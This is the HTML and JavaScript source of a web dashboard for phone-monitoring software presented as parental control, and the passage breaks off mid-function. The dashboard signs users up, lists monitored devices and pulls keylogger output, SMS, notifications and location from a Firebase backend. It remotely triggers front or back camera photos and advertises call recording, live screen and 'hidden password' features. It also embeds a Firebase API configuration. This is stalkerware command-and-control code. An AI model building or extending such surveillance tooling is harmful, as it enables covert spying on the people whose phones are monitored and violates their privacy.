<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Panel</title>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        :root {
            --bg-dark: #0d1117;
            --primary-dark: rgba(22, 27, 34, 0.8);
            --secondary-dark: #2a2a2a;
            --accent-blue: #58a6ff;
            --accent-green: #3fb950;
            --accent-red: #f85149;
            --accent-purple: #9b59b6;
            --accent-orange: #f39c12;
            --accent-teal: #1abc9c;
            --text-primary: #c9d1d9;
            --text-secondary: #8b949e;
            --border-color: rgba(240, 246, 252, 0.1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body { 
            font-family: 'Inter', sans-serif;
            background: #0d1117;
            color: var(--text-primary);
            overflow: hidden;
            padding-bottom: 40px; /* Add padding for footer */
        }

        .background-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: linear-gradient(45deg, #0d1117, #161b22, #010409, #0d1117);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .dashboard-container {
            display: flex;
            height: 100vh;
        }

        /* Sidebar Styles */
        .sidebar {
            width: 300px;
            background: var(--primary-dark);
            backdrop-filter: blur(10px);
            padding: 1.5rem;
            display: flex;
            flex-direction: column;
            border-right: 1px solid var(--border-color);
            transition: transform 0.3s ease-in-out;
            z-index: 1000;
        }
        .sidebar-header {
            margin-bottom: 2rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .sidebar-header h2 {
            color: #fff;
            font-size: 1.5rem;
        }
        .user-list {
            list-style-type: none;
            overflow-y: auto;
            flex-grow: 1;
        }
        .user-list-item {
            padding: 1rem;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .user-list-item:hover, .user-list-item.active {
            background-color: var(--accent-blue);
            color: #fff;
        }
        .user-list-item .user-name { font-weight: 600; }
        .user-list-item .device-name { font-size: 0.8rem; opacity: 0.8; }
        .user-list-item .user-id { 
            font-size: 0.7rem; 
            opacity: 0.6; 
            word-break: break-all; 
            margin-top: 4px;
        }

        /* Main Content Styles */
        .main-content {
            flex-grow: 1;
            padding: 2.5rem;
            overflow-y: auto;
            height: 100vh;
        }
        .main-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
        }
        .main-header h1 { font-size: 2.25rem; color: #fff; }
        #logout-btn {
            background: var(--accent-red);
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
        }

        #details-view { display: none; }
        .category-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }
        .category-btn {
            background-color: var(--secondary-dark);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 1.5rem 1rem;
            border-radius: 12px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 500;
            transition: all 0.3s;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 0.75rem;
            text-align: center;
        }
        .category-btn svg {
            width: 32px;
            height: 32px;
            transition: all 0.3s;
        }
        .category-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
            border-color: var(--accent-blue);
        }
        .category-btn.active {
            background-color: var(--accent-blue);
            color: #fff;
            border-color: var(--accent-blue);
        }
        .category-btn.active svg {
            stroke: #fff;
        }
        
        .data-display-area {
            background: var(--primary-dark);
            padding: 2rem;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            min-height: 400px;
        }
        
        .data-header {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid var(--border-color);
            flex-wrap: wrap;
            gap: 1rem;
        }
        .capture-photo-btn, #refresh-photos-btn {
            color: white;
            padding: 8px 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .capture-photo-btn { background-color: var(--accent-green); }
        #refresh-photos-btn { background-color: var(--accent-blue); }

        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1.5rem; }
        .photo-card {
            background-color: var(--secondary-dark);
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }
        .photo-card img {
            width: 100%;
            height: 180px;
            object-fit: cover;
        }
        .photo-info {
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .photo-time {
            font-size: 0.8rem;
            color: var(--text-secondary);
        }
        .view-btn {
            background-color: var(--accent-blue);
            color: white;
            border: none;
            border-radius: 6px;
            width: 36px;
            height: 36px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .map-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-top: 1.5rem;
            padding: 12px 20px;
            background-color: var(--accent-blue);
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            transition: background-color 0.3s;
        }
        .map-link:hover {
            opacity: 0.9;
        }

        #auth-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .auth-card {
            width: 100%;
            max-width: 400px;
            background: var(--primary-dark);
            backdrop-filter: blur(10px);
            padding: 2.5rem;
            border-radius: 16px;
            border: 1px solid var(--border-color);
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .auth-card h2 { 
            margin-bottom: 1.5rem;
            color: #fff;
            font-size: 1.8rem;
        }
        .auth-tabs {
            display: flex;
            background-color: var(--secondary-dark);
            border-radius: 8px;
            padding: 4px;
            margin-bottom: 1.5rem;
        }
        .auth-tab-btn {
            flex: 1;
            padding: 12px;
            background: transparent;
            border: none;
            color: var(--text-secondary);
            font-size: 1rem;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .auth-tab-btn.active {
            background: var(--accent-blue);
            color: #fff;
            box-shadow: 0 2px 10px rgba(88, 166, 255, 0.3);
        }
        .auth-card input {
            background-color: var(--secondary-dark);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
            padding: 16px;
            font-size: 1rem;
            transition: border-color 0.3s;
            width: 100%;
            margin-bottom: 1rem;
            border-radius: 8px;
        }
        .auth-card input:focus {
            outline: none;
            border-color: var(--accent-blue);
        }
        #submit-auth-btn {
             background: var(--accent-blue);
             padding: 16px;
             font-size: 1rem;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             transition: all 0.3s ease;
             width: 100%;
             margin-top: 1rem;
             border-radius: 8px;
             border: none;
             cursor: pointer;
             color: white;
             font-weight: 600;
        }
        #submit-auth-btn:hover {
            box-shadow: 0 6px 20px rgba(88, 166, 255, 0.3);
            transform: translateY(-2px);
        }
        #error-message { 
            color: var(--accent-red); 
            margin-top: 1rem; 
            font-weight: 500; 
            min-height: 20px;
        }

        .loader {
            border: 4px solid var(--secondary-dark); border-top: 4px solid var(--accent-blue);
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 40px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
            display: none; justify-content: center; align-items: center;
            z-index: 1001; padding: 20px; box-sizing: border-box;
        }
        .modal-content {
            background: var(--primary-dark);
            border: 1px solid var(--border-color);
            padding: 1.5rem; border-radius: 12px;
            width: 100%; max-width: 900px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            display: flex; flex-direction: column; max-height: 90vh;
        }
        .modal-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color);
        }
        .modal-header h3 { margin: 0; color: #fff; }
        .modal-body { overflow-y: auto; text-align: left; padding: 1rem 0; }
        .modal-close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-primary); }
        
        /* Modal Styles */
        #signup-success-modal .modal-content, #coming-soon-modal .modal-content {
            max-width: 500px;
            text-align: center;
        }
        #signup-success-modal .modal-header, #coming-soon-modal .modal-header {
            justify-content: center;
            border-bottom: none;
            padding-bottom: 0;
        }
        #signup-success-modal .modal-body, #coming-soon-modal .modal-body {
            padding-top: 0;
        }
        .home-btn, .ok-btn {
            background: var(--accent-green);
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            display: block;
            width: 100%;
            margin-top: 1.5rem;
            transition: background-color 0.3s;
        }
        .home-btn:hover, .ok-btn:hover {
            opacity: 0.9;
        }
        .ok-btn {
            background-color: var(--accent-blue);
        }

        #menu-btn {
            display: none;
            background: none;
            border: none;
            color: var(--text-primary);
            cursor: pointer;
            padding: 0;
            margin: 0;
        }
        #overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            z-index: 999;
        }

        /* Toast Notification */
        .toast-notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 12px 20px;
            border-radius: 8px;
            background-color: var(--accent-green);
            color: white;
            font-weight: 600;
            z-index: 2000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s, visibility 0.3s, top 0.3s;
        }
        .toast-notification.show {
            opacity: 1;
            visibility: visible;
            top: 40px;
        }

        /* Offline Banner */
        #offline-banner {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background-color: var(--text-secondary);
            color: var(--bg-dark);
            text-align: center;
            padding: 8px;
            z-index: 2001;
            font-weight: 500;
        }
        
        /* Footer Styles */
        .page-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: var(--bg-dark);
            color: var(--text-secondary);
            text-align: center;
            padding: 10px 0;
            font-size: 0.9rem;
            z-index: 1002;
            border-top: 1px solid var(--border-color);
        }
        .page-footer a {
            color: var(--accent-blue);
            text-decoration: none;
            font-weight: 600;
        }
        .page-footer a:hover {
            text-decoration: underline;
        }
        
        /* Notification Card Styles */
        .notification-list { display: flex; flex-direction: column; gap: 1rem; }
        .notification-card { background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; }
        .notification-header { display: flex; align-items: center; gap: 12px; margin-bottom: 0.75rem; }
        .notification-icon { width: 28px; height: 28px; flex-shrink: 0; }
        .notification-icon svg, .notification-icon img { width: 100%; height: 100%; border-radius: 4px; }
        .notification-title { font-weight: 600; color: #fff; }
        .notification-body { font-size: 0.9rem; line-height: 1.5; color: var(--text-primary); }
        .notification-footer { font-size: 0.75rem; opacity: 0.6; text-align: right; margin-top: 0.75rem; }


        @media (max-width: 992px) {
            .sidebar {
                position: fixed;
                left: 0;
                top: 0;
                height: 100%;
                transform: translateX(-100%);
            }
            .sidebar.open {
                transform: translateX(0);
            }
            #menu-btn {
                display: block;
            }
            .main-content {
                padding: 1.5rem;
            }
            .category-buttons {
                grid-template-columns: repeat(2, 1fr);
                gap: 1rem;
            }
        }
    </style>
</head>
<body>
    <div id="offline-banner">No Internet Connection. Please check your network.</div>
    <div id="toast-notification"></div>
    <div class="background-animation"></div>

    <div id="auth-container">
        <div class="auth-card">
            <h2>User Panel</h2>
            <div class="auth-tabs">
                <button id="login-tab-btn" class="auth-tab-btn active">Login</button>
                <button id="signup-tab-btn" class="auth-tab-btn">Sign Up</button>
            </div>
            <input type="email" id="email" placeholder="Email">
            <input type="password" id="password" placeholder="Password">
            <button id="submit-auth-btn">
                <span>Login</span>
            </button>
            <p id="error-message"></p>
        </div>
    </div>

    <div id="dashboard" class="dashboard-container" style="display: none;">
        <aside class="sidebar">
            <div class="sidebar-header">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
                <h2>Your Devices</h2>
            </div>
            <ul id="user-list" class="user-list"></ul>
        </aside>

        <main class="main-content">
            <header class="main-header">
                <button id="menu-btn">
                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
                </button>
                <h1 id="main-content-title">Select a Device</h1>
                <button id="logout-btn">Logout</button>
            </header>

            <div id="details-view">
                <div class="category-buttons">
                    <button class="category-btn" data-category="location">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                        <span>Location</span>
                    </button>
                    <button class="category-btn" data-category="photo">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
                        <span>Photos</span>
                    </button>
                    <button class="category-btn" data-category="keylogger">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-orange)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
                        <span>Keylogger</span>
                    </button>
                    <button class="category-btn" data-category="sms">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-purple)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
                        <span>SMS</span>
                    </button>
                    <button class="category-btn" data-category="notifications">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                        <span>Notifications</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="Live Screen">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="15" rx="2" ry="2"></rect><polyline points="17 2 12 7 7 2"></polyline></svg>
                        <span>Live Screen</span>
                    </button>
                     <button class="category-btn" data-category="coming-soon" data-feature-name="Screenshot">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.09 10.59a2.23 2.23 0 0 0-2.2-2.2H5.12a2.23 2.23 0 0 0-2.2 2.2v8.84a2.23 2.23 0 0 0 2.2 2.2h13.78a2.23 2.23 0 0 0 2.2-2.2v-8.84zM6.88 4.71h10.24"></path><line x1="12" y1="2.11" x2="12" y2="4.71"></line></svg>
                        <span>Screenshot</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="File Manager">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
                        <span>File Manager</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="Call Recording">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path><circle cx="19" cy="5" r="3"></circle></svg>
                        <span>Call Recording</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="Voice Recording">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-orange)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
                        <span>Voice Recording</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="Hidden Password">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-purple)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5 5 0 1 1-7.07-7.07l2 2"></path><path d="M9 12.55L11.45 15"></path><path d="M14.34 14.34L17 17"></path><path d="M1 1l22 22"></path></svg>
                        <span>Hidden Password</span>
                    </button>
                </div>
            </div>
        </main>
    </div>
    <div id="overlay"></div>

    <div id="data-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modal-title">Data</h3>
                <button id="modal-close-btn" class="modal-close-btn">&times;</button>
            </div>
            <div class="modal-body" id="modal-data-display-area">
            </div>
        </div>
    </div>

    <!-- Signup Success Modal -->
    <div id="signup-success-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Account Created Successfully!</h3>
            </div>
            <div class="modal-body">
                <p style="margin-bottom: 1rem; line-height: 1.6;">
                    <b>Next Step:</b> Install the application on your child's mobile device.
                </p>
                <p style="margin-bottom: 1.5rem; line-height: 1.6;">
                    When you open the app on your child's phone, please use the same Email and Password that you just used to sign up here.
                </p>
                <button id="home-redirect-btn" class="home-btn">Go to Home</button>
            </div>
        </div>
    </div>

    <!-- Coming Soon Modal -->
    <div id="coming-soon-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="coming-soon-title">Feature Coming Soon</h3>
            </div>
            <div class="modal-body">
                <p style="margin-bottom: 1rem; line-height: 1.6;">
                    We are working hard to bring you this new feature.
                </p>
                <p style="margin-bottom: 1.5rem; line-height: 1.6;">
                    You will be able to use it as soon as it's ready. Thank you for your patience!
                </p>
                <button id="coming-soon-ok-btn" class="ok-btn">Okay</button>
            </div>
        </div>
    </div>
    
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
        import { getDatabase, ref, onValue, remove, update } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
        import { getStorage, ref as storageRef, listAll, getDownloadURL, getMetadata, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";

        // Your NEW Firebase configuration
        const firebaseConfig = {
          apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
          authDomain: "home-demo12-d5814.firebaseapp.com",
          databaseURL: "https://home-demo12-d5814-default-rtdb.firebaseio.com",
          projectId: "home-demo12-d5814",
          storageBucket: "home-demo12-d5814.appspot.com",
          messagingSenderId: "433464727867",
          appId: "1:433464727867:web:731cc791eb8d48c5d9bf1e",
          measurementId: "G-NHHB06Z9HT"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);
        const storage = getStorage(app);

        // The rest of the script remains the same...
        const authContainer = document.getElementById('auth-container');
        const dashboard = document.getElementById('dashboard');
        const userList = document.getElementById('user-list');
        const mainContentTitle = document.getElementById('main-content-title');
        const detailsView = document.getElementById('details-view');
        const categoryButtonsContainer = document.querySelector('.category-buttons');
        const menuBtn = document.getElementById('menu-btn');
        const sidebar = document.querySelector('.sidebar');
        const overlay = document.getElementById('overlay');
        const dataModal = document.getElementById('data-modal');
        const modalTitle = document.getElementById('modal-title');
        const modalDataDisplayArea = document.getElementById('modal-data-display-area');
        const modalCloseBtn = document.getElementById('modal-close-btn');
        const errorMessage = document.getElementById('error-message');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const loginTabBtn = document.getElementById('login-tab-btn');
        const signupTabBtn = document.getElementById('signup-tab-btn');
        const submitAuthBtn = document.getElementById('submit-auth-btn');
        const submitAuthBtnText = submitAuthBtn.querySelector('span');
        const signupSuccessModal = document.getElementById('signup-success-modal');
        const homeRedirectBtn = document.getElementById('home-redirect-btn');
        const comingSoonModal = document.getElementById('coming-soon-modal');
        const comingSoonTitle = document.getElementById('coming-soon-title');
        const comingSoonOkBtn = document.getElementById('coming-soon-ok-btn');
        const toastNotification = document.getElementById('toast-notification');
        const offlineBanner = document.getElementById('offline-banner');

        let authMode = 'login';
        let activeDataListener = null;
        let selectedChildInfo = {};

        function showToast(message) {
            toastNotification.textContent = message;
            toastNotification.classList.add('show');
            setTimeout(() => {
                toastNotification.classList.remove('show');
            }, 3000);
        }

        function updateOnlineStatus() {
            offlineBanner.style.display = navigator.onLine ? 'none' : 'block';
        }

        window.addEventListener('online', updateOnlineStatus);
        window.addEventListener('offline', updateOnlineStatus);
        updateOnlineStatus();

        loginTabBtn.addEventListener('click', () => {
            authMode = 'login';
            loginTabBtn.classList.add('active');
            signupTabBtn.classList.remove('active');
            submitAuthBtnText.textContent = 'Login';
            errorMessage.textContent = '';
        });

        signupTabBtn.addEventListener('click', () => {
            authMode = 'signup';
            signupTabBtn.classList.add('active');
            loginTabBtn.classList.remove('active');
            submitAuthBtnText.textContent = 'Sign Up';
            errorMessage.textContent = '';
        });

        submitAuthBtn.addEventListener('click', () => {
            const email = emailInput.value;
            const password = passwordInput.value;
            errorMessage.textContent = '';

            if (!email || !password) {
                errorMessage.textContent = 'Please enter both email and password.';
                return;
            }

            if (authMode === 'login') {
                signInWithEmailAndPassword(auth, email, password)
                    .catch(error => {
                        errorMessage.textContent = getFriendlyAuthError(error.code);
                    });
            } else {
                createUserWithEmailAndPassword(auth, email, password)
                    .then((userCredential) => {
                        showToast('Sign-up Successful!');
                        authContainer.style.display = 'none';
                        signupSuccessModal.style.display = 'flex';
                    })
                    .catch(error => {
                        errorMessage.textContent = getFriendlyAuthError(error.code);
                    });
            }
        });

        homeRedirectBtn.addEventListener('click', () => {
            window.location.href = 'https://google.com';
        });

        document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));

        onAuthStateChanged(auth, user => {
            if (user) {
                if (signupSuccessModal.style.display !== 'flex') {
                    authContainer.style.display = 'none';
                    dashboard.style.display = 'flex';
                }
                loadUserDevices(user.uid);
            } else {
                authContainer.style.display = 'flex';
                dashboard.style.display = 'none';
                userList.innerHTML = '';
                detailsView.style.display = 'none';
                mainContentTitle.textContent = 'Select a Device';
            }
        });

        function getFriendlyAuthError(errorCode) {
            switch (errorCode) {
                case 'auth/invalid-email': return 'Please enter a valid email address.';
                case 'auth/user-not-found':
                case 'auth/wrong-password': return 'Invalid email or password.';
                case 'auth/email-already-in-use': return 'This email is already registered. Please login.';
                case 'auth/weak-password': return 'Password should be at least 6 characters long.';
                default: return 'An error occurred. Please try again.';
            }
        }

        function loadUserDevices(userId) {
            const usersRef = ref(db, `user/${userId}`);
            onValue(usersRef, (snapshot) => {
                userList.innerHTML = '';
                const data = snapshot.val();
                if (data) {
                    Object.keys(data).forEach(childKey => {
                        const childData = data[childKey];
                        const userName = childData?.data?.nameChild || childKey;
                        const deviceName = childData?.data?.nameDevice || 'Unknown Device';
                        const listItem = document.createElement('li');
                        listItem.className = 'user-list-item';
                        listItem.dataset.userid = userId;
                        listItem.dataset.childkey = childKey;
                        listItem.dataset.username = userName;
                        listItem.dataset.devicename = deviceName;
                        listItem.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><div><div class="user-name">${userName}</div><div class="device-name">${deviceName}</div></div>`;
                        userList.appendChild(listItem);
                    });
                } else {
                    userList.innerHTML = '<li>No devices found for your account.</li>';
                }
            });
        }

        userList.addEventListener('click', (e) => {
            const listItem = e.target.closest('.user-list-item');
            if (listItem) {
                document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active'));
                listItem.classList.add('active');
                selectedChildInfo = { userId: listItem.dataset.userid, childKey: listItem.dataset.childkey, userName: listItem.dataset.username, deviceName: listItem.dataset.devicename };
                mainContentTitle.textContent = `${selectedChildInfo.userName} (${selectedChildInfo.deviceName})`;
                detailsView.style.display = 'block';
                if (window.innerWidth <= 992) {
                    sidebar.classList.remove('open');
                    overlay.style.display = 'none';
                }
            }
        });

        categoryButtonsContainer.addEventListener('click', (e) => {
            const button = e.target.closest('.category-btn');
            if (button) {
                const category = button.dataset.category;
                if (category === 'coming-soon') {
                    const featureName = button.dataset.featureName;
                    openComingSoonModal(featureName);
                } else {
                    openDataModal(category);
                }
            }
        });

        function openDataModal(category) {
            modalTitle.textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
            dataModal.style.display = 'flex';
            displayCategoryData(category);
        }

        function openComingSoonModal(featureName) {
            comingSoonTitle.textContent = `${featureName} - Coming Soon`;
            comingSoonModal.style.display = 'flex';
        }

        function displayCategoryData(category) {
            if (activeDataListener) { activeDataListener(); }
            modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
            const { userId, childKey } = selectedChildInfo;
            if (!userId || !childKey) {
                modalDataDisplayArea.innerHTML = '<p>Please select a device from the list first.</p>';
                return;
            }
            if (category === 'photo') {
                renderPhotosFromStorage(userId, childKey);
                return;
            }
            const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`;
            const dataRef = ref(db, dataPath);
            activeDataListener = onValue(dataRef, (snapshot) => {
                renderData(category, snapshot.val());
            }, (error) => {
                console.error("Firebase read failed: " + error.code);
                modalDataDisplayArea.innerHTML = `<p>Error fetching data.</p>`;
            });
        }

        async function renderPhotosFromStorage(userId, childKey) {
            const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="0"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="1"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button></div>`;
            modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
            try {
                const photoDirRef = storageRef(storage, `user/${userId}/${childKey}/photo`);
                const res = await listAll(photoDirRef);
                if (res.items.length === 0) {
                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>';
                    return;
                }
                const photoPromises = res.items.map(itemRef => Promise.all([getDownloadURL(itemRef), getMetadata(itemRef)]));
                const photosWithData = await Promise.all(photoPromises);
                let photoGridHTML = '<div class="photo-grid">';
                photosWithData.sort((a, b) => new Date(b[1].timeCreated) - new Date(a[1].timeCreated)).forEach(([url, metadata]) => {
                    const timeCreated = new Date(metadata.timeCreated).toLocaleString('en-US');
                    photoGridHTML += `<div class="photo-card"><img src="${url}" alt="Captured photo" onerror="this.onerror=null;this.src='https://placehold.co/200x180/2a2a2a/e0e0e0?text=Error';"><div class="photo-info"><span class="photo-time">${timeCreated}</span><a href="${url}" target="_blank" class="view-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></a></div></div>`;
                });
                photoGridHTML += '</div>';
                modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
            } catch (error) {
                console.error("Error fetching photos:", error);
